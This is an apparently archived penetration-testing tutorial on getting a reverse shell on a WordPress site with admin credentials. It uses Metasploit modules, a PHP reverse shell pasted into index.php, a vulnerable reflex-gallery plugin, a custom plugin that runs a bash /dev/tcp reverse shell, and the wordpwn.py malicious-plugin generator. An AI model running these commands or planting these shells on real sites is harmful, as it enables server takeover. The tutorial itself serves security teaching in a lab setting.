@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">WordPress: Reverse Shell</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/wordpress-reverse-shell/" rel="bookmark"><time class="entry-date published" datetime="2019-09-28T14:25:12+00:00">September 28, 2019</time><time class="updated" datetime="2024-06-03T09:05:46+00:00">June 3, 2024</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This post focuses on WordPress security testing to explore the procedures for exploiting WordPress by compromising the admin console. We have already set up WordPress on our local machine, but if you want to learn about WordPress installation and configuration, please visit the link below:</span></p>
+<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/penetration-testing-lab-setup-wordpress/"><strong>WordPress Lab Setup in Ubuntu</strong></a></span></p>
+<p><span style="color: #000000;"><strong> </strong>As we know, WPScan is a standalone tool for identifying vulnerable plugins and themes in WordPress. However, this post will not cover a WPScan tutorial.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">Metasploit Framework</span></li>
+<li><span style="color: #000000;">Injecting Malicious code</span></li>
+<li><span style="color: #000000;">Inject Malicious Plugin</span></li>
+<li><span style="color: #000000;">Inject custom Malicious Plugin</span></li>
+<li><span style="color: #000000;">WetW0rk – Malicious WordPress Plugin</span></li>
+</ul>
+<p><span style="color: #000000;">Requirement:</span></p>
+<p><span style="color: #000000;">Host machine: WordPress</span></p>
+<p><span style="color: #000000;">Attacker machine: Kali Linux</span></p>
+<p><span style="color: #000000;">WordPress Credential: raj: 123 (in our case)</span></p>
+<p><span style="color: #000000;"><strong>Let’s begin!!</strong></span></p>
+<p><span style="color: #000000;">As you can see, I have access to the WordPress admin console via the web browser. To obtain a web shell, we need to exploit this CMS. There are multiple methods to exploit WordPress; let’s explore some of these operations.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWT1Tl4jNWU4iF3nnUilJBHN_p-bX2u-j6ck7twX5IHCPvGYs0xeebHrYRRb5tECKHQpfgAxj6rqZKLZVQbuL8sz_LUaQBJp6pvhHEjn0_-I_XPCTjoqTbfg3d17pCiEx4xIX_tCpdGkyZM4ALXyscC13EMJZDLA16pytpwsknfXGxBmpvGqsCd0d1Rzh9/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;">Metasploit Framework</span></h3>
+<p><span style="color: #000000;">The first method involves using the Metasploit framework. This module requires an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. Because this is an authenticated code execution by design, it should work on all versions of WordPress, resulting in a Meterpreter session to the webserver.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
+msf exploit(wp_admin_shell_upload) &gt; set USERNAME admin
+msf exploit(wp_admin_shell_upload) &gt; set PASSWORD admin
+msf exploit(wp_admin_shell_upload) &gt; set targeturi /wordpress
+msf exploit(wp_admin_shell_upload) &gt; exploit</pre>
+<p><span style="color: #000000;">Great! It works perfectly, and as you can see, we have successfully obtained a reverse connection to the web server via a Meterpreter session.</span></p>
+<h3><span style="color: #800000;">Injecting Malicious code</span></h3>
+<p><span style="color: #000000;">Another technique to spawn web server shells involves injecting malicious code. If you have an administrator’s username and password, log in to the admin panel and inject malicious PHP code into the index.php file, which is the entry point of the website.</span></p>
+<p><span style="color: #000000;">To do this, navigate to the WordPress dashboard, click on “Plugins” in the left-hand menu, and then click “Add New.”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9o0_ktAAKW7Vt6VcU70y-QjcKRZnW7To7YVP0RnfTkIQ5abxZpyFDWZutaoqw8_0jnthU-1tmtmErZWRG7HYAB7HQAf3wVg0UCElbAaFJ1ZUw0beMd2ywwgmvm746IIraPeuQfQfI-fV1AdG3LRVQF69SriPrI-kh8Gu724uVKVviG6tEb0QaT5AcuWj0/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">In the search bar, type “Advanced File Manager” and locate the plugin by “modalweb.”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOYnRb9zwXScxdwUmNu-X-uYn8pjbYsMlPTywRAaJtHf2NihHRG_zB0b_N8HVIJ_ydN57K3w4KgiinNn5aGU58nOjWxs5qJYRrEQeyTQeccujpR4U3QE0bY5VG47kcTV7jOwNTZRFd3zPL9PMVTzO84BvWvQNFqpmTXTmTbqG7eVYfSx_KoDWtwd3fPQWj/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Install and Activate the Plugin:</span></p>
+<p><span style="color: #000000;">Click “Install Now” and then “Activate” to enable the plugin on your WordPress site.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRaYvE4pEPkUx7cV4ntvkh_Fw5eK1YmWAUXYswrJcDBmItmmobudVgfEPJ6KuDq2dLSJprLa88KCsW5c9u1IzCDEmlyHLyH0okkZiFo39rse-BDsW7bufTWDzGaLcBbUh0RxwqpfGNzIWQOEpcDdsklP-a3gZ_-_epEhTlZKtFim_80f722XC8qxFiAY1u/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Once activated, go to the “File Manager” option in the left-hand menu.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheBqhKQ0e18wtki7cqAHtY8VG8WUbtOt40CxaKxRrbuaPlRU145aKF_gkv9L4wFMYLiKAF1_In3JnwDqBXdh77i_GQ5UNLBfn7-yZle3aCnHj_iuThn4NXWpf7pILC9vTg1xE76CP-_hMD3vJ73fN_5JeexOcWYdcBL8ZPPNvFVSxwNgdblTeHuIr9I1eP/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Use the file manager to navigate the file system of your WordPress installation. This interface allows you to view, upload, and edit files directly.</span></p>
+<p><span style="color: #000000;">In WordPress, right-click on index.php and select “Edit.” Before making any changes, create a duplicate of the file so that you can restore it later if needed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHc4wO8EVOq3guSBStpvADYKTlvfknhpASYPw4CC9I5ZkXct6NXbRUxOXmZzroGebe92wk6W-zi142bmSVR5sRN9B3E8Kd5Tc9zhUrQ9fLifutx-q06r6plQak9jUv5CSozXbdGq7ox5tCpqAhJ6gnOk5ehMCdowaq3oD3nv8Yxw5XpEfKdQtkeK8T9MN0/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">On kali, open and copy the code from /usr/share/webshells/php/php-reverse-shell.php</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSv1_jmxGQID97TuGQ2xb2U7wMgxTRRY2i5aEP6CNlh8dDMPa50LtH2LQwUgSbWzjJzKnLiCCrs0vg1t1fCbFOWKYHQXYMUB0KLgjYSXCetYo73ojPspsmwEFbYnSvLdDvW2RIhP7GvtJoc27JgdZ8iDTM7gqaInYLMiwr7si08v-g5dtPhVPnKqD1rHEx/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Paste the following code into the index.php file, updating the IP address with your Kali machine’s IP and the port number. Then click the ‘Save and Close’ button.</span></p>
+<p><span style="color: #000000;">Next, open a terminal on your Kali machine and start Netcat:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMddRSxQxq0kBW5Jlk_-Z_kbp2UHDRnpyrRDtqU_USvxfNf5EMRmsPXmfUSIYf2Ku3sqgf5ZY02nLCPCxQ6CFBT6DxIwVmtfyM5Cw9gDBRV3vH870r3YfeRp1CWfh0XDFay1g-kLgrMphnA8w1TeSXTbNwkCKRIM2iGydVm5mTmGIitJXj-7o943LgaOVb/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Try accessing the wordpress page in another browser tab which should get us the reverse shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt_RQvagh8po0C2GKf-jaSQX6UrP4s-5rbVxach9WWPfUUw5mqJX845edTn4ZpEodQh-HyjD2xAWcxOag9Kp38Zkp_xFyCreWmWY2GXPAAndF_eyDjlxn9eLam2dS4cCWZK88CL9ecwYUXY1Hquy8UGZbmIa4eMNmr-bNKs6GE7mmmF8AJ7PdXPJxqsj9w/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;">Inject Malicious Plugin</span></h3>
+<p><span style="color: #000000;">Sometimes, logged-on users may not have the necessary write permissions to modify the WordPress theme. In such cases, injecting a malicious WP plugin is an alternative strategy for acquiring a web shell.</span></p>
+<p><span style="color: #000000;">Once you have access to the WordPress dashboard, you can attempt to install a malicious plugin. In this example, I have already downloaded a vulnerable plugin from Exploit DB.</span></p>
+<p><span style="color: #000000;">Click <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/36374">here</a> </span>to download the plugin for practice.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL2gPiCQFXLi41mq72gaVH95jJaFJSHB65uGGplC18PXGJbFOx7CTHEpVMAKKL29Ti7lhMvoZYx0AXhrJUedSg4GojqEge94LPPb2yL6zeuyiI258U8AI7fCEhFC9wPqwdoVSX0UTXmrtMW2OqH6sMzUrnVUCQzOJ56gPUBX7qQ8PG6PhNk0lDOuU-xg9G/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the ZIP file for the plugin, it’s time to upload it.</span></p>
+<p><span style="color: #000000;">Dashboard &gt; plugins &gt; upload plugin</span></p>
+<p><span style="color: #000000;">In the “Plugins” menu, click “Add New” and then “Upload Plugin”. Choose your malicious plugin ZIP file and click “Install Now”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6ishxtwEgYLnexVwqD70_mQEETkAlnt25-elsNQ3DAjFS4J4bxMWLkfJokr13DO60ryzKkrkphbrQlWSNnmi_SEAtV-nOGzU54zeCvsKE9tNFzMK_El8OtlxylWDuidcF8Q4QnSfu-euZxfdJ0hkWO6S1g2a26g6h0KklngiKSM7ZWO7NiXUPZaeDF-03/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">After uploading, click “Activate” to enable the plugin.</span></p>
+<p><span style="color: #000000;">Once everything is properly set up, you can proceed with exploitation. We have installed a vulnerable plugin called “reflex-gallery,” which is known to be easily exploitable.</span></p>
+<p><span style="color: #000000;">To exploit this vulnerability, you can use the Metasploit framework. Load the following module and execute the provided command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/unix/webapp/wp_reflexgallery_file_upload
+set rhosts 192.168.31.205
+set targeturi /wordpress
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglNHJTSPSNh9JVtOxfCeOVe_biZV3Zh7Z3h6okGvGwiE8SBb-fPKETuPeh1_daWFpcUNUAu24GqXR9kJ1l_r3dHOEio0p-T52C7AJIIka38fs1yL3z1480hM3qU8ZRP9j0UjBow7zxAc27GVk0FIQcgfpkCsc00a1WJrRlaxLgoS8wUCdO9bpDHRnb7lBz/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">After executing the above commands, you will establish a Meterpreter session. As demonstrated in this article, there are various methods to exploit a website built on the WordPress platform.</span></p>
+<h3><span style="color: #800000;">Inject custom Malicious Plugin</span></h3>
+<p><span style="color: #000000;">As demonstrated earlier, we uploaded a vulnerable plugin with a readily available exploit. This time, we will inject our custom-generated malicious plugin to obtain a reverse shell. The process is straightforward: we have saved the reverse shell’s malicious code in a PHP file named “revshell.php” and compressed it into a ZIP file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'")</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkx6vPKLT-vD7nYEK0ybeteLnqDi38S9P61vFeCZYnnWVOTjvJDjpZuJffm3w6qnTqv6xZSj79XJI4Lav8512vRG47RcASx_hSFCDGAqcbuqVj6HXRXAL7FZYMXN32hBoZU3ojV55Mv0V7fAugW8E2qxuA7B2ctLnlNVvFvBBM6Tf1Vb1cxhfw9Bo2gLzI/s16000/15.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO7cFb6_7ERx1za1r7fGv-yC0VT3cjgnPY5sSAEbPUSGLKrik9G-W0xH-EfR4I3AzOSFEEbDV0x94tTS7onx860Zf7hNOCcmeUdB3jZhG36X2lrw226VjwSltROf6ZhUj-R4A-7tlmYzpdIKLT17dMId1fvSbfmHD_-SbOEfCjU2o6tE6vu2DPauyyYZq7/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Repeat the previous steps to upload the “revshell.zip” plugin file, then start a Netcat listener to establish a reverse connection to the target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaYaAI1w4cID_c-v4qILMMqS2btj8dDOS-imHRkfDxFtL552MYbdJ50CVx4dOeYvysNakI62Z3X5Fut7P2lipDhyphenhyphenxSfUj6jhgDgkZ4xkkUCHkqoABj06xPqy5EDIzApWCjL2foTlUcC0MEzv9toNEJaMwNsnq3P6xfU-J8_qehHr6DJhXXNn1HvXe3LiDb/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Once the package gets installed successfully, we need to activate the plugin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6l0gNokUlOZmXH9oWNN1phqsk355TYNZgc2VVk9P63VFpvshYmFVkLhMElD4dJNPKCdRrmuwWqMeZmB6ilxzn7apD8ve7UprVyB34KRPAMD9mHUqKDMUyVeA3ad754b9x8PNll6__O45cwrGBI6jI4mJloNCl3YwFt6t4nMB-y-9aZw9aArZZIEj_9-iC/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">As soon as you activate the plugin, it will establish a reverse connection, creating a Netcat session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiemW7YKPPQJlrBCqezVdkHXyTApVGBsp2kgJUPwMVlAycvf8Wsf2wblEjY5wdu5IJcfoRVKBsvGbJIb7QwBc1CVm_C0jVyrmJL4YVyVpxL52S96KIx2hykFhDn1ihJ-sD9WiLP7VZN4a_pKdf-8sWKRUgYnShsrj0mOggbgP8IFJwpNA0kBnNWP3e3346L/s16000/19.png"/></span></p>
+<h3><span style="color: #800000;">WetW0rk – Malicious WordPress plugin</span></h3>
+<p><span style="color: #000000;"><strong> </strong>First, we need to download the malicious WordPress plugin from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/wetw0rk/malicious-wordpress-plugin"><strong>GitHub</strong></a></span>. This plugin contains the code necessary to exploit the WordPress installation.</span></p>
+<p><span style="color: #000000;">Open a terminal on your Kali Linux machine and use the following command to clone the repository:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/wetw0rk/malicious-wordpress-plugin</pre>
+<p><span style="color: #000000;">Change to the directory containing the cloned repository.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9oZxjiv3YkyrLgaYLLqLl0waMFpps4u975q7WaisDWnixrSG9_UXDviCRnaG0C8oEDS_om2JrnyZjeBXdr5jNUi5lHEzZS1bmDGJEi4gnpHpuvvVBGjiu3hM-QLTP_oNnqgmdsi9OtPpUrKFvfX0C4sZ0Bw_5iF_eaLcuRDvGcGvvZl87-9-SxdXneRp6/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Next, we need to generate the malicious plugin that will be uploaded to the WordPress site to exploit it.</span></p>
+<p><span style="color: #000000;">Use the wordpwn.py script from the cloned repository to generate the plugin. Replace &lt;Kali_IP&gt; with your Kali machine’s IP address and 8888 with the desired port number:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python wordpwn.py &lt;Kali_IP&gt; 8888 Y</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidDsIdVirscnUfZJu-UzTIptm6Luki_5UtwowXiiAXAbSKhmEi8zENiDJuR5EQLd2INSc4oTD95Qb7O5kjth2TSAPHwr1O9eaKX5E1DAzZGMjwSyPSoBtJDsUdkMXRYRDv00fjSBr6pD2GlO9tkunKi14rLBQiEyJ0nOurrB38AXYs-5UXdRpIhT_-47Jk/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">After running the script, make a note of the URLs provided for triggering the reverse shell. These URLs will be used later to establish the connection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
+http://(target)/wp-content/plugins/malicious/QwertyRocks.php
+http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls</pre>
+<p><span style="color: #000000;">This script also starts metasploit framework as part of the process and would be waiting for the reverse shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh06DEvSZP4hpQA91awIZwdHdLJ2MG16CQ3Z1dUO8b46EM4Lk0Yy-nXMu-h-f5YMpVILRpWSaqS7KYVfcr4ApOXSNM1MwbOQGHH9eFjltvxevhb0-OkOTQnjCEe9SReTcPpz_yIoAtTrvktd_NrEX_SJjFSnVyX_lhcHqQNG9Byq6wxraxvD9MgYiIvMXp6/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">Now that we have generated the malicious plugin, we can proceed with uploading it to the WordPress site to exploit it.</span></p>
+<p><span style="color: #000000;">Upload the plugin as we did earlier.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj88yN9javsA4qV4EDuOa3UME4bx-dmC0cmLRxj7Y0L8ZTyHTK_WTluX36RgwnorMcpNehX2flnTYKf15kfBgMGkoG0xY2MZtbQvpHzAhBlb9ydxj5KxVPP5CwRD0fFEw3Q_mdPfNvedM189IluXclJ_K4LMc3Xipky63vuw_Sj0E29cOsVLxc7Bf5hJ2DY/s16000/28.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZ1E_6PAxJCp3vGoGdiUf2LYN32gUQ9Mt8osGoyzru4E36C7cM-fc7P_S6ttd4t5pvOnYnuJZ3DtyVzuzyQw7ctG6Dzu-5qZNQzfBdWYsv2KZnfUKA-5r0Xg3YIg9-odyJlcOHC4vbg66mlT9K5R-zSqex3Cv5AQiiMPSfa2NjebRTZ8Zv0gIn14Kushx7/s16000/29.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzcwbm5uXSI-aXHgfl33nNFLL4PkgDHcH-xr33DWMf-DTaJgx1kQ4fmFIh3BG43TWPkZ5fFXfzRHAHc15g1M-kob5kmpXFL07FtAEnc2_4GcYyDL3uXLKpWiIiYxk3YZs8zzZFAyJnL9D04ga9LVmT26BbGRXUfhanXZrBIlaIU4c5FOjJIYs_kwHFB1iI/s16000/30.png"/></span></p>
+<p><strong>Author: </strong><span style="color: #000000;">Phil Kalluri is a CyberSecurity and business automation consultant specializing in securing IT infrastructures and streamlining operations for SMBs, particularly in the healthcare and education sectors. Contact </span><strong><a href="https://www.linkedin.com/in/philkalluri/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
